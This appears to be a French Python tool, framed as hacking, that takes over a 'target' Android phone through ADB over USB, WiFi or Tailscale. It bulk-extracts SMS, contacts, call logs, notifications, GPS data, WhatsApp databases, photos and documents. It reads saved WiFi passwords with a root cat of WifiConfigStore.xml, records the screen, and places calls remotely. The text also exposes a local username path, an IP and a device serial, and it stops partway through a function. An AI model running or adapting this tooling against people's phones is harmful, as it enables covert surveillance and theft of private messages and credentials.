#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║     ███╗   ███╗███████╗ ██████╗  █████╗     ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗║
║     ████╗ ████║██╔════╝██╔════╝ ██╔══██╗    ██╔══██╗██║  ██║██╔═══██╗████╗  ██║║
║     ██╔████╔██║█████╗  ██║  ███╗███████║    ██████╔╝███████║██║   ██║██╔██╗ ██║║
║     ██║╚██╔╝██║██╔══╝  ██║   ██║██╔══██║    ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║║
║     ██║ ╚═╝ ██║███████╗╚██████╔╝██║  ██║    ██║     ██║  ██║╚██████╔╝██║ ╚████║║
║     ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝║
║                                                                                  ║
║                    CONTRÔLEUR TÉLÉPHONE ULTRA-COMPLET                           ║
║                         35+ FONCTIONNALITÉS AVANCÉES                            ║
║                                                                                  ║
║     📱 Cible: TECNO CK6 (Camon 20) - Android 14                                 ║
║     🔗 Connexion: USB / WiFi / Tailscale                                        ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import os
import sys
import json
import time
import threading
import shutil
from datetime import datetime
from pathlib import Path

# Pour notification longue
import textwrap

def envoyer_notification_longue(message, titre="Notification", device_id="101132534I100038"):
    """
    Envoie une notification longue (BigTextStyle) sur le téléphone via Termux (nécessite Termux + termux-api installé sur le téléphone).
    """
    # Limite raisonnable pour une notification Android (BigTextStyle) : ~400 caractères
    max_len = 400
    message = message.replace('"', '\"')
    titre = titre.replace('"', '\"')
    if len(message) <= max_len:
        cmd = f'am startservice --user 0 -n com.termux.api/.NotificationService --es title "{titre}" --es content "{message}"'
        adb_cmd = f'"C:\\Users\\davis\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\\platform-tools\\adb.exe" -s {device_id} shell {cmd}'
        print_info(f"[INFO] Envoi notification longue...\n{message}")
        os.system(adb_cmd)
    else:
        # Découper le message en plusieurs notifications
        chunks = [message[i:i+max_len] for i in range(0, len(message), max_len)]
        for idx, chunk in enumerate(chunks):
            titre_chunk = f"{titre} ({idx+1}/{len(chunks)})" if len(chunks) > 1 else titre
            cmd = f'am startservice --user 0 -n com.termux.api/.NotificationService --es title "{titre_chunk}" --es content "{chunk}"'
            adb_cmd = f'"C:\\Users\\davis\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\\platform-tools\\adb.exe" -s {device_id} shell {cmd}'
            print_info(f"[INFO] Envoi notification ({idx+1}/{len(chunks)})...\n{chunk}")
            os.system(adb_cmd)

# Exemple d'utilisation :
# envoyer_notification_longue("Ceci est un message très long qui doit s'afficher en entier dans la notification sur le téléphone Android. Testez avec un texte de plusieurs lignes pour vérifier l'affichage.")

# ═══════════════════════════════════════════════════════════════════════════════
# MENU : ENVOYER UNE NOTIFICATION PERSONNALISÉE
def menu_envoyer_notification():
    print("\n--- ENVOYER UNE NOTIFICATION PERSONNALISÉE ---")
    titre = input("Titre de la notification : ")
    message = input("Message à afficher (long possible) : ")
    envoyer_notification_longue(message, titre)
    print_success("Notification envoyée !")

# Pour tester rapidement :
# menu_envoyer_notification()
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

ADB_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
SCRCPY_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Genymobile.scrcpy_Microsoft.Winget.Source_8wekyb3d8bbwe\scrcpy-win64-v3.3.3\scrcpy.exe"

# IPs possibles
TAILSCALE_IP = "100.88.242.60:5555"
LOCAL_IP = "192.168.1.2:5555"

# Dossier de sortie
OUTPUT_BASE = Path(r"C:\Users\davis\OneDrive\Bureau\HACKING\02_EXTRACTION_DONNEES\TECNO_CK6")

# Appareil actif
DEVICE = None

# ═══════════════════════════════════════════════════════════════════════════════
# COULEURS CONSOLE
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_success(msg):
    print(f"    {C.GREEN}✅ {msg}{C.END}")

def print_error(msg):
    print(f"    {C.RED}❌ {msg}{C.END}")

def print_warning(msg):
    print(f"    {C.YELLOW}⚠️  {msg}{C.END}")

def print_info(msg):
    print(f"    {C.CYAN}ℹ️  {msg}{C.END}")

def print_data(label, value):
    print(f"    {C.MAGENTA}{label}:{C.END} {value}")

# ═══════════════════════════════════════════════════════════════════════════════
# FONCTIONS ADB DE BASE
# ═══════════════════════════════════════════════════════════════════════════════

def adb(command, timeout=60):
    """Exécuter une commande ADB"""
    global DEVICE
    try:
        if DEVICE:
            full_cmd = f'"{ADB_PATH}" -s {DEVICE} {command}'
        else:
            full_cmd = f'"{ADB_PATH}" {command}'
        
        result = subprocess.run(
            full_cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        return result.stdout.strip() + result.stderr.strip()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERREUR] {e}"

def adb_shell(command, timeout=60):
    """Raccourci pour adb shell"""
    return adb(f'shell {command}', timeout)

def adb_pull(remote, local):
    """Télécharger un fichier"""
    return adb(f'pull "{remote}" "{local}"')

def adb_push(local, remote):
    """Envoyer un fichier"""
    return adb(f'push "{local}" "{remote}"')

# ═══════════════════════════════════════════════════════════════════════════════
# CONNEXION ET DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

def find_devices():
    """Trouver tous les appareils connectés"""
    result = adb("devices -l")
    devices = []
    
    for line in result.split('\n'):
        # Chercher les lignes avec "device" (état connecté)
        if 'device' in line and 'List' not in line and 'attached' not in line:
            parts = line.split()
            if len(parts) >= 2 and parts[1] == 'device':
                device_id = parts[0]
                # Extraire le modèle
                model = "Inconnu"
                if 'model:' in line:
                    model = line.split('model:')[1].split()[0]
                devices.append((device_id, model))
    
    return devices

def connect_device():
    """Connecter au téléphone"""
    global DEVICE
    
    print(f"\n{C.CYAN}🔍 Recherche des appareils...{C.END}\n")
    
    # Essayer de se connecter via différentes méthodes
    connections = [
        ("USB", None),
        ("Tailscale", TAILSCALE_IP),
        ("WiFi Local", LOCAL_IP)
    ]
    
    for name, ip in connections:
        if ip:
            print(f"    Tentative {name} ({ip})...", end=" ")
            adb(f"connect {ip}")
            time.sleep(1)
        else:
            print(f"    Vérification {name}...", end=" ")
        
        devices = find_devices()
        if devices:
            print(f"{C.GREEN}OK{C.END}")
            break
        print(f"{C.RED}Non trouvé{C.END}")
    
    if not devices:
        print_error("Aucun appareil trouvé!")
        print_info("Vérifiez que le débogage USB est activé")
        return False
    
    # Si plusieurs appareils, choisir
    if len(devices) > 1:
        print(f"\n{C.YELLOW}Plusieurs appareils détectés:{C.END}")
        for i, (dev_id, model) in enumerate(devices, 1):
            print(f"    [{i}] {dev_id} ({model})")
        
        choice = input("\nChoisir (1-{}): ".format(len(devices)))
        try:
            DEVICE = devices[int(choice)-1][0]
        except:
            DEVICE = devices[0][0]
    else:
        DEVICE = devices[0][0]
    
    # Vérifier la connexion
    model = adb_shell("getprop ro.product.model")
    print(f"\n{C.GREEN}✅ Connecté à: {model} ({DEVICE}){C.END}")
    
    return True

# ═══════════════════════════════════════════════════════════════════════════════
# CRÉATION DES DOSSIERS
# ═══════════════════════════════════════════════════════════════════════════════

def create_output_folders():
    """Créer les dossiers de sortie"""
    folders = [
        OUTPUT_BASE,
        OUTPUT_BASE / "SMS",
        OUTPUT_BASE / "Contacts",
        OUTPUT_BASE / "Appels",
        OUTPUT_BASE / "Photos",
        OUTPUT_BASE / "Videos",
        OUTPUT_BASE / "WhatsApp",
        OUTPUT_BASE / "Documents",
        OUTPUT_BASE / "Screenshots",
        OUTPUT_BASE / "Recordings",
        OUTPUT_BASE / "Apps",
        OUTPUT_BASE / "System",
        OUTPUT_BASE / "Notifications",
        OUTPUT_BASE / "WiFi",
        OUTPUT_BASE / "GPS",
    ]
    
    for folder in folders:
        folder.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 1: INFORMATIONS SYSTÈME
# ═══════════════════════════════════════════════════════════════════════════════

def get_system_info():
    """Récupérer toutes les informations système"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 INFORMATIONS SYSTÈME COMPLÈTES{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    info = {}
    
    # Hardware
    print(f"    {C.YELLOW}[MATÉRIEL]{C.END}")
    info['modele'] = adb_shell("getprop ro.product.model")
    info['marque'] = adb_shell("getprop ro.product.brand")
    info['fabricant'] = adb_shell("getprop ro.product.manufacturer")
    info['device'] = adb_shell("getprop ro.product.device")
    info['hardware'] = adb_shell("getprop ro.hardware")
    
    print_data("Modèle", info['modele'])
    print_data("Marque", info['marque'])
    print_data("Fabricant", info['fabricant'])
    print_data("Processeur", info['hardware'])
    
    # Système
    print(f"\n    {C.YELLOW}[SYSTÈME]{C.END}")
    info['android'] = adb_shell("getprop ro.build.version.release")
    info['sdk'] = adb_shell("getprop ro.build.version.sdk")
    info['build'] = adb_shell("getprop ro.build.display.id")
    info['security_patch'] = adb_shell("getprop ro.build.version.security_patch")
    
    print_data("Android", info['android'])
    print_data("SDK", info['sdk'])
    print_data("Build", info['build'])
    print_data("Patch sécurité", info['security_patch'])
    
    # Écran
    print(f"\n    {C.YELLOW}[ÉCRAN]{C.END}")
    screen = adb_shell("wm size")
    density = adb_shell("wm density")
    info['screen'] = screen.replace("Physical size: ", "")
    info['density'] = density.replace("Physical density: ", "")
    
    print_data("Résolution", info['screen'])
    print_data("Densité", info['density'])
    
    # Identifiants
    print(f"\n    {C.YELLOW}[IDENTIFIANTS]{C.END}")
    info['serial'] = adb_shell("getprop ro.serialno")
    info['android_id'] = adb_shell("settings get secure android_id")
    
    print_data("Numéro de série", info['serial'])
    print_data("Android ID", info['android_id'])
    
    # Réseau
    print(f"\n    {C.YELLOW}[RÉSEAU]{C.END}")
    info['wifi_mac'] = adb_shell("cat /sys/class/net/wlan0/address 2>/dev/null")
    ip_output = adb_shell("ip addr show wlan0 2>/dev/null | grep 'inet '")
    info['ip'] = ip_output.split()[1] if 'inet' in ip_output else "N/A"
    
    print_data("MAC WiFi", info['wifi_mac'])
    print_data("IP", info['ip'])
    
    # Batterie
    print(f"\n    {C.YELLOW}[BATTERIE]{C.END}")
    battery = adb_shell("dumpsys battery")
    for line in battery.split('\n'):
        if 'level' in line.lower():
            info['battery_level'] = line.split(':')[-1].strip()
            print_data("Niveau", f"{info['battery_level']}%")
        elif 'status' in line.lower():
            status_code = line.split(':')[-1].strip()
            status_map = {'1': 'Inconnu', '2': 'En charge', '3': 'Décharge', '4': 'Non charge', '5': 'Pleine'}
            info['battery_status'] = status_map.get(status_code, status_code)
            print_data("État", info['battery_status'])
    
    # Stockage
    print(f"\n    {C.YELLOW}[STOCKAGE]{C.END}")
    storage = adb_shell("df -h /sdcard | tail -1")
    parts = storage.split()
    if len(parts) >= 4:
        info['storage_total'] = parts[1]
        info['storage_used'] = parts[2]
        info['storage_free'] = parts[3]
        print_data("Total", info['storage_total'])
        print_data("Utilisé", info['storage_used'])
        print_data("Libre", info['storage_free'])
    
    # Sauvegarder
    info['timestamp'] = datetime.now().isoformat()
    with open(OUTPUT_BASE / "System" / "system_info.json", "w", encoding="utf-8") as f:
        json.dump(info, f, indent=2, ensure_ascii=False)
    
    print_success(f"Sauvegardé: System/system_info.json")
    
    return info

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 2: EXTRACTION SMS
# ═══════════════════════════════════════════════════════════════════════════════

def extract_sms():
    """Extraire tous les SMS"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}💬 EXTRACTION DES SMS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # SMS reçus
    print(f"    {C.YELLOW}[SMS REÇUS]{C.END}")
    inbox = adb_shell('content query --uri content://sms/inbox --projection "address,body,date,read" --sort "date DESC"')
    
    inbox_count = inbox.count("Row:")
    print_info(f"{inbox_count} SMS reçus trouvés")
    
    # Afficher les 5 derniers
    rows = inbox.split("Row:")
    for row in rows[1:6]:
        if "address=" in row:
            addr = row.split("address=")[1].split(",")[0] if "address=" in row else "?"
            body = row.split("body=")[1].split(", date=")[0][:50] if "body=" in row else ""
            print(f"        📩 {addr}: {body}...")
    
    # SMS envoyés
    print(f"\n    {C.YELLOW}[SMS ENVOYÉS]{C.END}")
    sent = adb_shell('content query --uri content://sms/sent --projection "address,body,date" --sort "date DESC"')
    
    sent_count = sent.count("Row:")
    print_info(f"{sent_count} SMS envoyés trouvés")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "SMS" / "sms_inbox.txt", "w", encoding="utf-8") as f:
        f.write(f"=== SMS REÇUS - {datetime.now()} ===\n\n")
        f.write(inbox)
    
    with open(OUTPUT_BASE / "SMS" / "sms_sent.txt", "w", encoding="utf-8") as f:
        f.write(f"=== SMS ENVOYÉS - {datetime.now()} ===\n\n")
        f.write(sent)
    
    print_success(f"Sauvegardé: SMS/sms_inbox.txt ({inbox_count} messages)")
    print_success(f"Sauvegardé: SMS/sms_sent.txt ({sent_count} messages)")
    
    return inbox_count + sent_count

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 3: EXTRACTION CONTACTS
# ═══════════════════════════════════════════════════════════════════════════════

def extract_contacts():
    """Extraire tous les contacts"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📇 EXTRACTION DES CONTACTS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    contacts = adb_shell('content query --uri content://contacts/phones --projection "display_name,number,photo_id"')
    
    count = contacts.count("Row:")
    print_info(f"{count} contacts trouvés")
    
    # Parser et afficher
    rows = contacts.split("Row:")
    contact_list = []
    
    for row in rows[1:]:
        if "display_name=" in row:
            name = row.split("display_name=")[1].split(",")[0] if "display_name=" in row else "?"
            number = row.split("number=")[1].split(",")[0] if "number=" in row else "?"
            contact_list.append({"name": name, "number": number})
            
            if len(contact_list) <= 10:
                print(f"        👤 {name[:25]:<25} 📞 {number}")
    
    if count > 10:
        print(f"\n        ... et {count - 10} autres contacts")
    
    # Sauvegarder en TXT et JSON
    with open(OUTPUT_BASE / "Contacts" / "contacts.txt", "w", encoding="utf-8") as f:
        f.write(f"=== CONTACTS - {datetime.now()} ===\n\n")
        f.write(contacts)
    
    with open(OUTPUT_BASE / "Contacts" / "contacts.json", "w", encoding="utf-8") as f:
        json.dump(contact_list, f, indent=2, ensure_ascii=False)
    
    print_success(f"Sauvegardé: Contacts/contacts.txt")
    print_success(f"Sauvegardé: Contacts/contacts.json")
    
    return count

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 4: HISTORIQUE APPELS
# ═══════════════════════════════════════════════════════════════════════════════

def extract_call_history():
    """Extraire l'historique des appels"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📞 HISTORIQUE DES APPELS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    calls = adb_shell('content query --uri content://call_log/calls --projection "number,name,type,date,duration" --sort "date DESC"')
    
    count = calls.count("Row:")
    print_info(f"{count} appels trouvés")
    
    print(f"\n    {C.YELLOW}Légende: 📥 Entrant | 📤 Sortant | ❌ Manqué{C.END}\n")
    
    # Parser et afficher
    rows = calls.split("Row:")
    
    for row in rows[1:11]:
        if "number=" in row:
            number = row.split("number=")[1].split(",")[0] if "number=" in row else "?"
            name = row.split("name=")[1].split(",")[0] if "name=" in row else ""
            duration = row.split("duration=")[1].split(",")[0] if "duration=" in row else "0"
            call_type = row.split("type=")[1].split(",")[0] if "type=" in row else "0"
            
            icon = {"1": "📥", "2": "📤", "3": "❌"}.get(call_type, "📞")
            display = f"{name} ({number})" if name and name != "NULL" else number
            
            print(f"        {icon} {display[:35]:<35} ⏱️ {duration}s")
    
    if count > 10:
        print(f"\n        ... et {count - 10} autres appels")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Appels" / "call_history.txt", "w", encoding="utf-8") as f:
        f.write(f"=== HISTORIQUE APPELS - {datetime.now()} ===\n")
        f.write("Type: 1=Entrant, 2=Sortant, 3=Manqué\n\n")
        f.write(calls)
    
    print_success(f"Sauvegardé: Appels/call_history.txt")
    
    return count

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 5: CAPTURE D'ÉCRAN
# ═══════════════════════════════════════════════════════════════════════════════

def take_screenshot():
    """Prendre une capture d'écran"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📸 CAPTURE D'ÉCRAN{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/screenshot_{timestamp}.png"
    local_file = OUTPUT_BASE / "Screenshots" / f"screenshot_{timestamp}.png"
    print_info("Capture en cours...")
    adb_shell(f"screencap -p {remote_file}")
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    if local_file.exists():
        size = local_file.stat().st_size / 1024
        print_success(f"Capture sauvegardée : {local_file.name} ({size:.1f} KB)")
        print_info(f"Chemin du fichier image : {local_file}")
        return str(local_file)
    else:
        print_error("Échec de la capture")
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 6: ENREGISTREMENT ÉCRAN
# ═══════════════════════════════════════════════════════════════════════════════

def record_screen(duration=30):
    """Enregistrer l'écran"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🎥 ENREGISTREMENT ÉCRAN{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    if duration > 180:
        duration = 180
        print_warning("Durée limitée à 180 secondes")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/record_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"record_{timestamp}.mp4"
    print_info(f"Enregistrement pendant {duration} secondes...")
    print_info("(L'écran du téléphone est enregistré)")
    adb_shell(f"screenrecord --time-limit {duration} {remote_file}", timeout=duration+10)
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"Vidéo sauvegardée : {local_file.name} ({size:.1f} MB)")
        print_info(f"Chemin du fichier vidéo : {local_file}")
        return str(local_file)
    else:
        print_error("Échec de l'enregistrement")
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 7: AFFICHAGE EN DIRECT (SCRCPY)
# ═══════════════════════════════════════════════════════════════════════════════

def live_screen():
    """Afficher l'écran en direct avec scrcpy"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📺 AFFICHAGE EN DIRECT{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    if os.path.exists(SCRCPY_PATH):
        print_info("Lancement de scrcpy...")
        print_info("Vous pouvez contrôler le téléphone avec la souris/clavier")
        
        cmd = f'"{SCRCPY_PATH}"'
        if DEVICE:
            cmd += f' -s {DEVICE}'
        
        subprocess.Popen(cmd, shell=True)
        print_success("Scrcpy lancé!")
    else:
        print_error("Scrcpy non trouvé!")
        print_info("Installation: winget install Genymobile.scrcpy")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 8: NOTIFICATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def get_notifications():
    """Lire les notifications"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}🔔 NOTIFICATIONS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    notifs = adb_shell("dumpsys notification --noredact")
    
    # Extraire les infos importantes
    important = []
    current_pkg = ""
    current_title = ""
    current_text = ""
    
    for line in notifs.split('\n'):
        if 'pkg=' in line:
            if current_pkg:
                important.append(f"{current_pkg}: {current_title} - {current_text}")
            current_pkg = line.split('pkg=')[1].split()[0] if 'pkg=' in line else ""
            current_title = ""
            current_text = ""
        elif 'android.title=' in line:
            current_title = line.split('android.title=')[1].split(',')[0][:50]
        elif 'android.text=' in line:
            current_text = line.split('android.text=')[1].split(',')[0][:50]
    
    # Afficher les notifications
    print(f"    {C.YELLOW}Dernières notifications:{C.END}\n")
    
    for notif in important[:15]:
        if notif.strip():
            print(f"        🔔 {notif[:70]}")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Notifications" / "notifications.txt", "w", encoding="utf-8") as f:
        f.write(f"=== NOTIFICATIONS - {datetime.now()} ===\n\n")
        f.write('\n'.join(important))
    
    print_success(f"Sauvegardé: Notifications/notifications.txt")
    
    return len(important)

def send_notification(title, message):
    """Envoyer une notification au téléphone"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📨 ENVOI DE NOTIFICATION{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    title = title.replace("'", "\\'").replace('"', '\\"')
    message = message.replace("'", "\\'").replace('"', '\\"')
    
    notif_id = f"notif_{datetime.now().strftime('%H%M%S')}"
    result = adb_shell(f'cmd notification post -t "{title}" "{message}" {notif_id}')
    
    if "posting" in result.lower() or "notification" in result.lower():
        print_success(f"Notification envoyée!")
        print_data("Titre", title)
        print_data("Message", message)
        return True
    else:
        print_error("Échec de l'envoi")
        return False

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 9: LOCALISATION GPS
# ═══════════════════════════════════════════════════════════════════════════════

def get_location():
    """Obtenir la localisation GPS"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📍 LOCALISATION GPS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    location = adb_shell("dumpsys location")
    
    # Chercher les coordonnées
    print(f"    {C.YELLOW}Dernières positions connues:{C.END}\n")
    
    coords = []
    for line in location.split('\n'):
        if any(x in line.lower() for x in ['last location', 'mlastlocation', 'location=', 'latitude', 'longitude']):
            coords.append(line.strip())
            if len(coords) <= 10:
                print(f"        📍 {line.strip()[:70]}")
    
    # Provider actif
    print(f"\n    {C.YELLOW}Fournisseurs de localisation:{C.END}")
    providers = adb_shell("settings get secure location_providers_allowed")
    print_data("Actifs", providers)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "GPS" / "location.txt", "w", encoding="utf-8") as f:
        f.write(f"=== LOCALISATION - {datetime.now()} ===\n\n")
        f.write(location)
    
    print_success(f"Sauvegardé: GPS/location.txt")
    
    return coords

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 10: RÉSEAUX WIFI
# ═══════════════════════════════════════════════════════════════════════════════

def get_wifi_networks():
    """Lister les réseaux WiFi enregistrés"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📶 RÉSEAUX WIFI ENREGISTRÉS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Méthode 1: cmd wifi (Android 10+)
    networks = adb_shell("cmd wifi list-networks 2>/dev/null")
    
    if networks and "Network Id" in networks:
        print(f"    {C.YELLOW}Réseaux enregistrés:{C.END}\n")
        for line in networks.split('\n'):
            if line.strip() and "Network Id" not in line:
                print(f"        📶 {line.strip()}")
    
    # Méthode 2: fichier config (avec root)
    wifi_config = adb_shell("su -c 'cat /data/misc/wifi/WifiConfigStore.xml' 2>/dev/null")
    
    if "SSID" in wifi_config:
        print(f"\n    {C.YELLOW}Avec mots de passe (root requis):{C.END}\n")
        for line in wifi_config.split('\n'):
            if 'SSID' in line or 'PreSharedKey' in line:
                print(f"        🔐 {line.strip()[:60]}")
    
    # Réseau actuel
    print(f"\n    {C.YELLOW}Connexion actuelle:{C.END}")
    current = adb_shell("dumpsys wifi | grep 'mWifiInfo'")
    if current:
        print_data("Info", current[:100])
    
    # Sauvegarder
    with open(OUTPUT_BASE / "WiFi" / "wifi_networks.txt", "w", encoding="utf-8") as f:
        f.write(f"=== WIFI - {datetime.now()} ===\n\n")
        f.write("=== RÉSEAUX ===\n")
        f.write(networks)
        f.write("\n\n=== CONFIG (si root) ===\n")
        f.write(wifi_config[:5000])
    
    print_success(f"Sauvegardé: WiFi/wifi_networks.txt")

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 11: APPLICATIONS
# ═══════════════════════════════════════════════════════════════════════════════

def list_apps():
    """Lister les applications installées"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📱 APPLICATIONS INSTALLÉES{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    # Apps tierces
    apps = adb_shell("pm list packages -3")
    app_list = [line.replace("package:", "") for line in apps.split('\n') if line.strip()]
    
    print(f"    {C.YELLOW}Applications tierces ({len(app_list)}):{C.END}\n")
    
    # Apps sensibles
    sensitive = {
        "com.whatsapp": "WhatsApp",
        "com.facebook.katana": "Facebook",
        "com.instagram.android": "Instagram",
        "com.google.android.gm": "Gmail",
        "com.zhiliaoapp.musi"
        "cally": "TikTok",
        "org.telegram.messenger": "Telegram",
        "com.snapchat.android": "Snapchat",
        "com.twitter.android": "Twitter/X",
    }
    
    for pkg, name in sensitive.items():
        if pkg in apps:
            print(f"        🔴 {name} ({pkg})")
    
    print(f"\n        ... et {len(app_list) - sum(1 for p in sensitive if p in apps)} autres apps")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "installed_apps.txt", "w", encoding="utf-8") as f:
        f.write(f"=== APPLICATIONS - {datetime.now()} ===\n\n")
        f.write('\n'.join(sorted(app_list)))
    
    print_success(f"Sauvegardé: Apps/installed_apps.txt ({len(app_list)} apps)")
    
    return app_list

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 12: TÉLÉCHARGEMENT FICHIERS
# ═══════════════════════════════════════════════════════════════════════════════

def download_photos():
    """Télécharger les photos"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📷 TÉLÉCHARGEMENT DES PHOTOS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "Photos"
    
    print_info("Téléchargement de DCIM/Camera...")
    adb_pull("/sdcard/DCIM/Camera", str(dest / "Camera"))
    
    print_info("Téléchargement de Pictures...")
    adb_pull("/sdcard/Pictures", str(dest / "Pictures"))
    
    # Compter
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers téléchargés dans Photos/")
    
    return count

def download_whatsapp():
    """Télécharger les données WhatsApp"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}💬 TÉLÉCHARGEMENT WHATSAPP{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "WhatsApp"
    
    print_info("Téléchargement WhatsApp Media...")
    adb_pull("/sdcard/WhatsApp/Media", str(dest / "Media"))
    
    print_info("Téléchargement WhatsApp Databases...")
    adb_pull("/sdcard/WhatsApp/Databases", str(dest / "Databases"))
    
    # Compter
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers téléchargés dans WhatsApp/")
    
    return count

def download_documents():
    """Télécharger les documents"""
    print(f"\n{C.CYAN}{'═'*70}{C.END}")
    print(f"{C.BOLD}📄 TÉLÉCHARGEMENT DOCUMENTS{C.END}")
    print(f"{C.CYAN}{'═'*70}{C.END}\n")
    
    dest = OUTPUT_BASE / "Documents"
    
    print_info("Téléchargement Documents...")
    adb_pull("/sdcard/Documents", str(dest / "Documents"))
    
    print_info("Téléchargement Download...")
    adb_pull("/sdcard/Download", str(dest / "Download"))
    
    count = sum(1 for f in dest.rglob("*") if f.is_file())
    print_success(f"{count} fichiers téléchargés dans Documents/")
    
    return count

# ═══════════════════════════════════════════════════════════════════════════════
# MODULE 13: CONTRÔLE DU TÉLÉPHONE
# ═══════════════════════════════════════════════════════════════════════════════

def open_url(url):
    """Ouvrir une URL sur le téléphone"""
    adb_shell(f'am start -a android.intent.action.VIEW -d "{url}"')
    print_success(f"URL ouverte: {url}")

def open_app(package):
    """Ouvrir une application"""
    adb_shell(f"monkey -p {package} -c android.intent.category.LAUNCHER 1")
    print_success(f"Application lancée: {package}")

def send_key(keycode):
    """Envoyer une touche"""
    adb_shell(f"input keyevent {keycode}")

def send_text(text):
    """Envoyer du texte"""
    text = text.replace(" ", "%s").replace("'", "\\'")
    adb_shell(f'input text "{text}"')
    print_success(f"Texte envoyé: {text}")

def take_call(number):
    """Passer un appel"""
    adb_shell(f'am start -a android.intent.action.CALL -d "tel:{number}"')
    print_success(f"Appel vers: {number}")

def send_sms_screen(number, message=""):
    """Ouvrir l'écran SMS"""
    message = message.replace(" ", "%20")
    adb_shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" --es sms_body "{message}"')
    print_success(f"Écran SMS ouvert pour: {number}")

def vibrate():
    """Faire vibrer le téléphone"""
    adb_shell("cmd vibrator vibrate 500")
    print_success("Vibration envoyée")

def set_volume(level):
    """Régler le volume"""
